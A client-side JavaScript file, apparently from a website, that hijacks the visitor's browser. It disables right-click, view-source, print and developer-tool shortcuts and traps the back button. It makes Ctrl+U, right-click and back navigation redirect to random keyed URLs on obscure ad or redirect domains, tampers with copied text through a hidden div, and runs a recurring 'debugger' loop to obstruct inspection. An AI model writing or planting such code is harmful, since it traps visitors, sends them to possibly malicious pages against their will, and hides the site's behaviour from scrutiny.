/* anti ctrl */
shortcut = {
    all_shortcuts: {},
    add: function (a, b, c) {
        var d = {
            type: "keydown",
            propagate: !1,
            disable_in_input: !1,
            target: document,
            keycode: !1
        };
        if (c)
            for (var e in d) "undefined" == typeof c[e] && (c[e] = d[e]);
        else c = d;
        d = c.target, "string" == typeof c.target && (d = document.getElementById(c.target)), a = a.toLowerCase(), e = function (d) {
            d = d || window.event;
            if (c.disable_in_input) {
                var e;
                d.target ? e = d.target : d.srcElement && (e = d.srcElement), 3 == e.nodeType && (e = e.parentNode);
                if ("INPUT" == e.tagName || "TEXTAREA" == e.tagName) return
            }
            d.keyCode ? code = d.keyCode : d.which && (code = d.which), e = String.fromCharCode(code)
                .toLowerCase(), 188 == code && (e = ","), 190 == code && (e = ".");
            var f = a.split("+"),
                g = 0,
                h = {
                    "`": "~",
                    1: "!",
                    2: "@",
                    3: "#",
                    4: "$",
                    5: "%",
                    6: "^",
                    7: "&",
                    8: "*",
                    9: "(",
                    0: ")",
                    "-": "_",
                    "=": "+",
                    ";": ":",
                    "'": '"',
                    ",": "<",
                    ".": ">",
                    "/": "?",
                    "\\": "|"
                },
                i = {
                    esc: 27,
                    escape: 27,
                    tab: 9,
                    space: 32,
                    "return": 13,
                    enter: 13,
                    backspace: 8,
                    scrolllock: 145,
                    scroll_lock: 145,
                    scroll: 145,
                    capslock: 20,
                    caps_lock: 20,
                    caps: 20,
                    numlock: 144,
                    num_lock: 144,
                    num: 144,
                    pause: 19,
                    "break": 19,
                    insert: 45,
                    home: 36,
                    "delete": 46,
                    end: 35,
                    pageup: 33,
                    page_up: 33,
                    pu: 33,
                    pagedown: 34,
                    page_down: 34,
                    pd: 34,
                    left: 37,
                    up: 38,
                    right: 39,
                    down: 40,
                    f1: 112,
                    f2: 113,
                    f3: 114,
                    f4: 115,
                    f5: 116,
                    f6: 117,
                    f7: 118,
                    f8: 119,
                    f9: 120,
                    f10: 121,
                    f11: 122,
                    f12: 123
                },
                j = !1,
                l = !1,
                m = !1,
                n = !1,
                o = !1,
                p = !1,
                q = !1,
                r = !1;
            d.ctrlKey && (n = !0), d.shiftKey && (l = !0), d.altKey && (p = !0), d.metaKey && (r = !0);
            for (var s = 0; k = f[s], s < f.length; s++) "ctrl" == k || "control" == k ? (g++, m = !0) : "shift" == k ? (g++, j = !0) : "alt" == k ? (g++, o = !0) : "meta" == k ? (g++, q = !0) : 1 < k.length ? i[k] == code && g++ : c.keycode ? c.keycode == code && g++ : e == k ? g++ : h[e] && d.shiftKey && (e = h[e], e == k && g++);
            if (g == f.length && n == m && l == j && p == o && r == q && (b(d), !c.propagate)) return d.cancelBubble = !0, d.returnValue = !1, d.stopPropagation && (d.stopPropagation(), d.preventDefault()), !1
        }, this.all_shortcuts[a] = {
            callback: e,
            target: d,
            event: c.type
        }, d.addEventListener ? d.addEventListener(c.type, e, !1) : d.attachEvent ? d.attachEvent("on" + c.type, e) : d["on" + c.type] = e
    },
    remove: function (a) {
        var a = a.toLowerCase(),
            b = this.all_shortcuts[a];
        delete this.all_shortcuts[a];
        if (b) {
            var a = b.event,
                c = b.target,
                b = b.callback;
            c.detachEvent ? c.detachEvent("on" + a, b) : c.removeEventListener ? c.removeEventListener(a, b, !1) : c["on" + a] = !1
        }
    }
}, shortcut.add("Ctrl+U", function () {
    var pages = [

        "https://euizhltcd6ih.com/a1cxr71k2p?key=fb4650db89e13e5f6259102256e2dd28",
        "https://jc32arlvqpv8.com/febkqdwq69?key=85936785030b9494c1edaf06c2488cc3",
        "https://slahpxqb6wto.com/y2zywvx6?key=1913df17f2e84ef9fe8bdcd130e989e7",
        "https://www.effectivecpmcontent.com/ian5sddbhn?key=cab0e894642dc56f27b8ada7e2ed25ff",
        "https://www.effectivecpmcontent.com/eawyaazrt4?key=78778840d1d33d8d36ec5f44c894e44b",
        "https://practicallysacrificestock.com/b2ughqsc?key=e4d471abe0b82cfdf0e8a0ea8b121e2d",
        "https://www.safestgatetocontent.com/u3fyz7ax?key=d2a2e52da1a3d7dfe97062207314bc65",
        "https://www.safestgatetocontent.com/zt86y8vudf?key=aa7208b0d41c522aff283732b16f67f5",
        "https://chokupsupto.com/be3UV_0.P/3YpXvRb/mmV/JmZhDR0w0/NUD/U/x-NTDRQ/4PLoTIQX0mNKTiEQ0iNrD-kj",
        "https://chokupsupto.com/be3JV/0.PW3Up/vabLmlVTJ/ZbDy0/0uNDDAU/xKNYDsQmw/LQT_QI0gNWT/E/0pNSDsEo",
        "https://cqwajn.com/gosl/InNpZCI6MTExOTE3OCwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
        "https://cqwajn.com/gosl/InNpZCI6MTA5NjY3OSwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
        "https://cqwajn.com/gosl/InNpZCI6MTEyNTkwMiwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",
        "https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",

    ];

    function randomPage() {
        return pages[Math.round(Math.random() * (pages.length - 1))];
    }
    location.href = randomPage();
});

/* antiback */
(function (window, location) {
    history.replaceState(null, document.title, location.pathname + "#!/history");
    history.pushState(null, document.title, location.pathname);
    window.addEventListener("popstate", function () {
        if (location.hash === "#!/history") {
            history.replaceState(null, document.title, location.pathname);
            setTimeout(function () {
                var pages = [

                    "https://euizhltcd6ih.com/a1cxr71k2p?key=fb4650db89e13e5f6259102256e2dd28",
                    "https://jc32arlvqpv8.com/febkqdwq69?key=85936785030b9494c1edaf06c2488cc3",
                    "https://slahpxqb6wto.com/y2zywvx6?key=1913df17f2e84ef9fe8bdcd130e989e7",
                    "https://www.effectivecpmcontent.com/ian5sddbhn?key=cab0e894642dc56f27b8ada7e2ed25ff",
                    "https://www.effectivecpmcontent.com/eawyaazrt4?key=78778840d1d33d8d36ec5f44c894e44b",
                    "https://practicallysacrificestock.com/b2ughqsc?key=e4d471abe0b82cfdf0e8a0ea8b121e2d",
                    "https://www.safestgatetocontent.com/u3fyz7ax?key=d2a2e52da1a3d7dfe97062207314bc65",
                    "https://www.safestgatetocontent.com/zt86y8vudf?key=aa7208b0d41c522aff283732b16f67f5",
                    "https://chokupsupto.com/be3UV_0.P/3YpXvRb/mmV/JmZhDR0w0/NUD/U/x-NTDRQ/4PLoTIQX0mNKTiEQ0iNrD-kj",
                    "https://chokupsupto.com/be3JV/0.PW3Up/vabLmlVTJ/ZbDy0/0uNDDAU/xKNYDsQmw/LQT_QI0gNWT/E/0pNSDsEo",
                    "https://cqwajn.com/gosl/InNpZCI6MTExOTE3OCwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
                    "https://cqwajn.com/gosl/InNpZCI6MTA5NjY3OSwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
                    "https://cqwajn.com/gosl/InNpZCI6MTEyNTkwMiwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",
                    "https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",

                ];

                function randomPage() {
                    return pages[Math.round(Math.random() * (pages.length - 1))];
                }
                location.href = randomPage();
            }, 0);
        }
    }, false);
}(window, location));

/* copas */
function nocopas() {
    var e = window.getSelection();
    pagelink = " Read more : " + document.location.href, copytext = e + pagelink, newdiv = document.createElement("div"), newdiv.style.position = "absolute", newdiv.style.left = "-99999px", document.body.appendChild(newdiv), newdiv.innerHTML = copytext, e.selectAllChildren(newdiv), window.setTimeout(function () {
        document.body.removeChild(newdiv)
    }, 100)
}
document.addEventListener("copy", nocopas);

// script redirect ctrl U
function redirectCU(e) {
    if (e.ctrlKey && e.which == 85) {
        var pages = [

            "https://euizhltcd6ih.com/a1cxr71k2p?key=fb4650db89e13e5f6259102256e2dd28",
            "https://jc32arlvqpv8.com/febkqdwq69?key=85936785030b9494c1edaf06c2488cc3",
            "https://slahpxqb6wto.com/y2zywvx6?key=1913df17f2e84ef9fe8bdcd130e989e7",
            "https://www.effectivecpmcontent.com/ian5sddbhn?key=cab0e894642dc56f27b8ada7e2ed25ff",
            "https://www.effectivecpmcontent.com/eawyaazrt4?key=78778840d1d33d8d36ec5f44c894e44b",
            "https://practicallysacrificestock.com/b2ughqsc?key=e4d471abe0b82cfdf0e8a0ea8b121e2d",
            "https://www.safestgatetocontent.com/u3fyz7ax?key=d2a2e52da1a3d7dfe97062207314bc65",
            "https://www.safestgatetocontent.com/zt86y8vudf?key=aa7208b0d41c522aff283732b16f67f5",
            "https://chokupsupto.com/be3UV_0.P/3YpXvRb/mmV/JmZhDR0w0/NUD/U/x-NTDRQ/4PLoTIQX0mNKTiEQ0iNrD-kj",
            "https://chokupsupto.com/be3JV/0.PW3Up/vabLmlVTJ/ZbDy0/0uNDDAU/xKNYDsQmw/LQT_QI0gNWT/E/0pNSDsEo",
            "https://cqwajn.com/gosl/InNpZCI6MTExOTE3OCwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
            "https://cqwajn.com/gosl/InNpZCI6MTA5NjY3OSwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
            "https://cqwajn.com/gosl/InNpZCI6MTEyNTkwMiwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",
            "https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",

        ];

        function randomPage() {
            return pages[Math.round(Math.random() * (pages.length - 1))];
        }
        location.href = randomPage();
        return false;
    }
}
document.onkeydown = redirectCU;

//anti copas jquery
window.oncontextmenu = function () {
    return false;
}
$(document).keydown(function (event) {
    if (event.keyCode == 123) {
        return false;
    } else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) ||
        (event.ctrlKey && event.shiftKey && event.keyCode == 74) ||
        (event.ctrlKey && event.keyCode == 85) ||
        (event.ctrlKey && event.keyCode == 80)) {
        return false;
    }
});

//Script Redirect Klik Kanan
function redirectKK(e) {
    if (e.which == 3) {
        var pages = [

            "https://euizhltcd6ih.com/a1cxr71k2p?key=fb4650db89e13e5f6259102256e2dd28",
            "https://jc32arlvqpv8.com/febkqdwq69?key=85936785030b9494c1edaf06c2488cc3",
            "https://slahpxqb6wto.com/y2zywvx6?key=1913df17f2e84ef9fe8bdcd130e989e7",
            "https://www.effectivecpmcontent.com/ian5sddbhn?key=cab0e894642dc56f27b8ada7e2ed25ff",
            "https://www.effectivecpmcontent.com/eawyaazrt4?key=78778840d1d33d8d36ec5f44c894e44b",
            "https://practicallysacrificestock.com/b2ughqsc?key=e4d471abe0b82cfdf0e8a0ea8b121e2d",
            "https://www.safestgatetocontent.com/u3fyz7ax?key=d2a2e52da1a3d7dfe97062207314bc65",
            "https://www.safestgatetocontent.com/zt86y8vudf?key=aa7208b0d41c522aff283732b16f67f5",
            "https://chokupsupto.com/be3UV_0.P/3YpXvRb/mmV/JmZhDR0w0/NUD/U/x-NTDRQ/4PLoTIQX0mNKTiEQ0iNrD-kj",
            "https://chokupsupto.com/be3JV/0.PW3Up/vabLmlVTJ/ZbDy0/0uNDDAU/xKNYDsQmw/LQT_QI0gNWT/E/0pNSDsEo",
            "https://cqwajn.com/gosl/InNpZCI6MTExOTE3OCwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
            "https://cqwajn.com/gosl/InNpZCI6MTA5NjY3OSwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwODY1Mjcs?si1=&si2=",
            "https://cqwajn.com/gosl/InNpZCI6MTEyNTkwMiwic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",
            "https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=&si2=",

        ];

        function randomPage() {
            return pages[Math.round(Math.random() * (pages.length - 1))];
        }
        window.open(randomPage());
        return false;
    }
}
document.oncontextmenu = redirectKK;


/* inspect element */
! function t() {
    try {
        ! function t(n) {
            1 === ("" + n / n)
                .length && 0 !== n || function () {}.constructor("debugger")(), t(++n)
        }(0)
    } catch (n) {
        setTimeout(t, 5e3)
    }
}();